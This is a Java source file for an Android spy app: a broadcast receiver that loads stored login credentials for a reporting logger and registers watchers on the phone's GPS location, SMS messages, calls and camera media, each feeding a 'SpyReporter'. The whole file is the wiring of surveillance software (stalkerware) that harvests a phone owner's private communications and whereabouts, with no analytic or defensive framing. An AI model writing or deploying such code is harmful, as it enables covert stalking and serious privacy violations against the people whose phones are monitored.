package org.ddth.android.spy;

import org.ddth.android.monitor.AndroidBroadcastReceiver;
import org.ddth.android.monitor.core.AndroidEvent;
import org.ddth.android.monitor.observer.AndroidCallWatcher;
import org.ddth.android.monitor.observer.AndroidCameraWatcher;
import org.ddth.android.monitor.observer.AndroidGpsWatcher;
import org.ddth.android.monitor.observer.AndroidSmsWatcher;
import org.ddth.android.spy.reporter.CallSpyReporter;
import org.ddth.android.spy.reporter.GpsSpyReporter;
import org.ddth.android.spy.reporter.MediaSpyReporter;
import org.ddth.android.spy.reporter.SmsSpyReporter;
import org.ddth.android.spy.reporter.SpyReporter;
import org.ddth.http.core.Logger;
import org.ddth.mobile.monitor.core.Watchdog;
import org.ddth.mobile.monitor.core.Watcher;

import android.content.Context;
import android.content.SharedPreferences;

/**
 * @author khoanguyen
 */
public class SpyReceiver extends AndroidBroadcastReceiver {
	public static final String APPLICATION_TAG = "spiderman";
	public static final String PASSWORD_FIELD = "password";
	public static final String USERNAME_FIELD = "username";

	@Override
	protected void initialize(Watchdog watchdog, AndroidEvent event) {
		// Yeah, I also want to read my configuration from local preferences
		SharedPreferences settings = event.getContext().getSharedPreferences(
				APPLICATION_TAG, Context.MODE_PRIVATE);
		String username = settings.getString(USERNAME_FIELD, "");
		String password = settings.getString(PASSWORD_FIELD, "");
		SpyReporter.getSpyLogger().setAuthCredentials(username, password);

		Watcher[] watchers = new Watcher[] {
			// I want to monitor GPS activities
			new AndroidGpsWatcher(new GpsSpyReporter(), 480000),
			// I want to monitor SMS activities
			new AndroidSmsWatcher(new SmsSpyReporter()),
			// I want to monitor Call activities
			new AndroidCallWatcher(new CallSpyReporter()),
			// I want to monitor Media activities
			new AndroidCameraWatcher(new MediaSpyReporter(username)),
			// I want to bring up configuration dialog
			new ConfiguratingWatcher()
		};
		for (Watcher watcher : watchers) {
			watchdog.register(watcher.getObserver());
		}

		Logger.getDefault().debug("Registered watchers successfully!");
	}
}